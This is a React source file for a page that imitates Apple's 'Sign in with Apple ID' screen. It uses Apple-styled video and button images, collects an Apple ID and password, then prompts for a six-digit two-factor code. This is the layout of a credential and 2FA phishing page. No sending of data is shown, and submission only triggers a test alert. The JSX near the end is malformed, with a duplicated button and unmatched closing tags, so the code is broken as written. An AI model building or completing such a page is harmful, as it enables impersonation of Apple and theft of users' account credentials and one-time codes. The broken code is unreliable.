import React, { useState } from "react";

export default function Main() {
  const [step, setStep] = useState("login");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [name, setName] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  function handleEmailEnter(e) {
    if (e.key === "Enter") {
      e.preventDefault();
      if (!email.trim()) return;
      setShowPassword(true);
    }
  }

  function handleLoginSubmit(e) {
    e.preventDefault();
    if (!email.trim() || !password.trim()) return;
    setStep("name");
  }

  function handleNameSubmit(e) {
    e.preventDefault();
    if (!name.trim()) return;
    alert("Form working");
  }

  return (
    <div className="main">
      <div className="main-items">
        <video
  className="item-1"
  autoPlay
  loop
  muted
  playsInline
>
  <source src="/applevideo.mp4" type="video/mp4" />
</video>
        {step === "login" && (
          <>
            <h1 className="item-2">Sign in with Apple ID</h1>

            <input
              type="text"
              placeholder="Apple ID"
              className="item-3"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              onKeyDown={handleEmailEnter}
            />

            {showPassword && (
              <>
                <input
                  type="password"
                  placeholder="Password"
                  className="item-3 password-reveal"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />

                <button
                  type="button"
                  onClick={handleLoginSubmit}
                  className="signin-image-button"
                >
                  <img
                    src="/apple-signinbutton.jpeg"
                    alt="Sign in"
                    className="signin-button-image"
                  />
                </button>
              </>
            )}

            <div className="item-4">
              <input type="checkbox" /> Keep me signed in
            </div>

            <a href="/forgot" className="item-5">
              Forgotten your Apple ID or password?
            </a>

            <a href="/create" className="item-6">
              Create Apple ID
            </a>
          </>
        )}

        {step === "name" && (
  <>
    <h1 className="item-2">enter your 2 Factor Code</h1>

    <div className="code-container">
      {[0,1,2,3,4,5].map((i) => (
        <input
          key={i}
          type="text"
          maxLength="1"
          className="code-box"
          onChange={(e) => {
            const next = e.target.nextSibling;
            if (e.target.value && next) next.focus();
          }}
        />
      ))}
    </div>

    <button
      type="button"
      onClick={handleNameSubmit}
      className="signin-image-button"
    >
      <img
        src="/apple-signinbutton.jpeg"
        alt="Continue"
        className="signin-button-image"
      />
    </button>
  </>
)}

            <button
              type="button"
              onClick={handleNameSubmit}
              className="signin-image-button"
            >
              <img
                src="/apple-signinbutton.jpeg"
                alt="Continue"
                className="signin-button-image"
              />
            </button>
          </>
        )}
      </div>
    </div>
  );
}
